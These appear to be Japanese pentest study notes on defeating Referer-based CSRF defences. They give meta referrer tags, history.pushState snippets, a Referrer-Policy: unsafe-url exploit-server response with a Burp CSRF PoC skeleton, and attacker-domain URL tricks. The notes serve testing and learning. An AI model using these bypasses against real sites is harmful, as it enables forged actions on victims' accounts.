## Refererヘッダの存在に依存した検証のバイパス

1. Refererヘッダとその値の両方を削除してもエラーが表示されないことを確認
2. 該当リクエストでCSRFペイロードを生成する
3. Refererヘッダの値を削除するmetaタグを注入する
```html
<head>
	<meta name="referrer" content="never">
</head>
<body>
...
```

## Refererヘッダ検証のさまざまなバイパス方法

###### 1. Refererヘッダの検証ルールを明らかにする

- ルール：意図されたドメイン名で始まるべき
```http
Referer: https://hogehoge/TARGET_NET # Error Invalid Referer...
```
- ルール：意図されたドメイン名が含まれているべき
```http
Referer: https://hogehoge/TARGET_NET # 正常
```

###### 2. ルールに則り、Refererヘッダの値を書き換えるスクリプトを用意する

- ルール：意図されたドメイン名で始まるべき
```js
history.pushState('', '', 'TARGET_NET.EXPLOIT_DOMAIN')
```
-  ルール：意図されたドメイン名が含まれているべき
```js
history.pushState('', '', '/?TARGET_NET')
```

3. エクスプロイトサーバのヘッダに`Referrer-Policy`を追加する。また、CSRF PoC Generatorで生成したペイロードの`<form>`前にステップ2で用意したスクリプトを注入する
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Referrer-Policy: unsafe-url

<html>
<!--CSRF PoC generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/?TARGET_NET')</script>
 <form>
 ...
```

###### 基本原理

値が期待されたドメイン名で始まることを検証する場合

-  攻撃者のドメインのサブドメインとして正規のドメインを使う
```
http://true-domain.attacker-domain/csrf-attack
```

値に期待されたドメイン名が含まれていることを検証する場合

- クエリ文字列などURLの仕様を使う
```
http://attacker-domain/csrf-attack?true-domain
```
